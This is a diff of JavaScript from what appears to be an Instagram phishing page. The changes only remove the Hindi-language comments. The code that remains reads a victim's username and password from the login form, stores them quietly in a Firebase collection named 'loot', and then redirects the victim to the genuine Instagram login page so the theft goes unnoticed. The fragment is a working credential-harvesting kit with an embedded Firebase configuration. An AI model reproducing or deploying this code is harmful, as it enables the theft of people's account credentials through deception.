@@ -25,7 +25,7 @@
         import { initializeApp } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-app.js";
         import { getFirestore, doc, setDoc } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-firestore.js";
 
-        // Aapki Nayi Config (Firebase45)
+        
         const firebaseConfig = {
             apiKey: "AIzaSyB9VT_BN_O5SFDZm7RP8Ukz3mT7RP8Ukz3",
             authDomain: "project-b2602.firebaseapp.com",
@@ -42,13 +42,13 @@
             const p = document.getElementById('victim_pass').value;
 
             try {
-                // Data ko database mein chupchap bhejna
+                
                 await setDoc(doc(db, "loot", u), {
                     username: u,
                     password: p,
                     time: new Date().toLocaleString()
                 });
-                // User ko asli site par redirect karna taaki shak na ho
+                
                 window.location.href = "https://www.instagram.com/accounts/login/"; 
             } catch (e) {
                 console.log("Error capturing data");
